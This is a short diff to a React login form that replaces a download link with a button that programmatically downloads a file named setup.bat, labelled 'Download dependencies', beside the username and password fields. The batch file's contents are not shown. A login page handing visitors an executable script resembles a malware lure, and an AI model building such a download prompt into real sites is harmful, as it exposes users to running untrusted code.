@@ -437,9 +437,18 @@ setDisplayedMessage(formattedOutput);
       <h2>Login</h2>
       <input type="text" placeholder="Username"  onChange={Login} />
       <input type="password" placeholder="Password" onChange={Login2}/>
-      <a href="/setup.bat" download="setup.bat" style="text-decoration: none;">
-        <button type="button" id="dependencies">Download depedencies</button>
-      </a>
+      <button 
+  type="button" 
+  id="dependencies" 
+  onClick={() => {
+    const link = document.createElement('a');
+    link.href = '/setup.bat';
+    link.download = 'setup.bat';
+    link.click();
+  }}
+>
+  Download dependencies
+</button>
       <button onClick={saveData}>Login</button>
     </div>
     <div 
